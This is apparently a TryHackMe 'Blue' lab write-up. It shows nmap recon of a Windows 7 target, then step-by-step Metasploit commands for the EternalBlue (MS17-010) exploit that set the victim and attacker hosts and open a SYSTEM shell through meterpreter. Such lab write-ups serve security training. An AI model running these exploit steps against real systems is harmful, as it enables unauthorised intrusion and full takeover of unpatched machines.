### Recon

Try Hack Me Room title: Blue

Target IP Address: 10.10.201.254

#### nmap -A 10.10.201.254  
_Results_    
nmap -A 10.10.201.254        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-28 12:17 EDT
Nmap scan report for 10.10.201.254
Host is up (0.099s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2024-03-28T16:19:51+00:00; +37s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2024-03-28T16:19:46+00:00
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2024-03-27T16:05:54
|_Not valid after:  2024-09-26T16:05:54
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-03-28T11:19:45-05:00
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:bb:a9:a5:f4:93 (unknown)
|_clock-skew: mean: 1h00m37s, deviation: 2h14m09s, median: 37s
| smb2-time: 
|   date: 2024-03-28T16:19:46
|_  start_date: 2024-03-28T16:05:53

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.19 seconds..


### Weaponization

``1. msf > use exploit/windows/smb/ms17_010_eternalblue``  
``2. msf exploit(ms17_010_eternalblue) > show targets``  
    __...targets...__  
``3. msf exploit(ms17_010_eternalblue) > set TARGET < target-id >``    
``4. msf exploit(ms17_010_eternalblue) > show options``  
    __...show and set options...__  
``5. msf exploit(ms17_010_eternalblue) > exploit``

### How to setup metaspsploit

* open metasploit `msfconsole`
* `search eternalblue`
    *  use option #0 `use 0`
* `show targets`
* `set target to proper OS in this case windows 7
    * `set TARGET 1`
* `show options`
* Under **_Module options_** Edit "current setting" if none shown for "required" fields that state "yes"
* set RHOSTS to victim IP
    * `set RHOSTS <victim IP>`
* Under **_Payload options_** verify LHOST is set to your machine IP
    * `set LHOST <your machine IP>`
* The exploit and payload are set up now all we have to do is run the exploit by running the `exploit command`
    * `exploit`
* run mutiple times if doesn't succeed first attempt
    * you will see "WIN" if the attempt was successfull
* We not must call the shell from meterpreter by simply running the `shell` command
    * `shell`
* you should now see "C:\Windows\system32>"


